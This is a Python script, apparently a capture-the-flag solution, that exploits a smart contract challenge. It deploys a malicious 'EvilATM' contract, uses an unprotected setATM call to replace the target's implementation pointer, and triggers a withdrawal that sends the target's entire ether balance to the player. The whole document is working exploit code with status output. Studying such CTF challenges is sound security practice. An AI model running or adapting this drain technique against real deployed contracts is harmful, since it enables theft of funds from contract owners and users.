#!/usr/bin/env python3
import sys
from web3 import Web3
from eth_account import Account
from solcx import compile_source, install_solc, set_solc_version

SOLIDITY = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract EvilATM {
    function processWithdrawal(address recipient, uint256) external returns (bool) {
        (bool ok,) = payable(recipient).call{value: address(this).balance}("");
        require(ok, "drain failed");
        return true;
    }
}
"""

def sel(w3, sig):
    return w3.keccak(text=sig)[:4]

def enc_addr(addr):
    return bytes.fromhex(addr[2:].rjust(64, "0"))

def send(w3, acct, tx):
    tx.setdefault("from", acct.address)
    tx.setdefault("nonce", w3.eth.get_transaction_count(acct.address))
    tx.setdefault("chainId", w3.eth.chain_id)
    tx.setdefault("gasPrice", w3.eth.gas_price)
    if "gas" not in tx:
        try:
            tx["gas"] = int(w3.eth.estimate_gas(tx) * 1.3)
        except Exception:
            tx["gas"] = 1_000_000
    signed = acct.sign_transaction(tx)
    h = w3.eth.send_raw_transaction(signed.raw_transaction)
    r = w3.eth.wait_for_transaction_receipt(h, timeout=120)
    print(f"[*] tx={h.hex()} status={r.status} gas={r.gasUsed}")
    if r.status != 1:
        raise RuntimeError(f"transaction reverted: {h.hex()}")
    return r

def impl_at(w3, setup):
    raw = w3.eth.get_storage_at(setup, 1)
    return Web3.to_checksum_address("0x" + raw[-20:].hex())

def raw_bool(w3, setup, selector_hex):
    out = w3.eth.call({"to": setup, "data": bytes.fromhex(selector_hex)})
    return int.from_bytes(out, "big") != 0

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} RPC PRIVATE_KEY SETUP")
        raise SystemExit(1)

    rpc, key, setup = sys.argv[1:]
    w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 30}))
    acct = Account.from_key(key)
    setup = Web3.to_checksum_address(setup)

    print("[*] player =", acct.address)
    print("[*] setup  =", setup)
    print("[*] balance=", w3.from_wei(w3.eth.get_balance(setup), "ether"), "ETH")
    print("[*] slot1  =", impl_at(w3, setup))
    print("[*] solved =", raw_bool(w3, setup, "64d98f6e"))

    try:
        set_solc_version("0.8.20")
    except Exception:
        install_solc("0.8.20")
        set_solc_version("0.8.20")

    compiled = compile_source(SOLIDITY, output_values=["abi", "bin"], solc_version="0.8.20")
    _, art = next(iter(compiled.items()))
    factory = w3.eth.contract(abi=art["abi"], bytecode=art["bin"])

    print("[*] deploying EvilATM")
    tx = factory.constructor().build_transaction({
        "from": acct.address,
        "nonce": w3.eth.get_transaction_count(acct.address),
        "chainId": w3.eth.chain_id,
        "gasPrice": w3.eth.gas_price,
    })
    r = send(w3, acct, tx)
    evil = Web3.to_checksum_address(r.contractAddress)
    print("[+] evil   =", evil)

    print("[*] replacing implementation")
    send(w3, acct, {
        "to": setup,
        "data": sel(w3, "setATM(address)") + enc_addr(evil),
        "value": 0,
    })

    installed = impl_at(w3, setup)
    print("[*] slot1 now =", installed)
    if installed != evil:
        raise RuntimeError("implementation overwrite failed")

    print("[*] crediting player with 1 wei")
    send(w3, acct, {
        "to": setup,
        "data": sel(w3, "donatePP(address)") + enc_addr(acct.address),
        "value": 1,
    })

    print("[*] triggering malicious processWithdrawal")
    send(w3, acct, {
        "to": setup,
        "data": sel(w3, "withdrawPP()"),
        "value": 0,
    })

    bal = w3.eth.get_balance(setup)
    solved = raw_bool(w3, setup, "64d98f6e")
    print("[+] setup balance after =", w3.from_wei(bal, "ether"), "ETH")
    print("[+] isSolved =", solved)

if __name__ == "__main__":
    main()
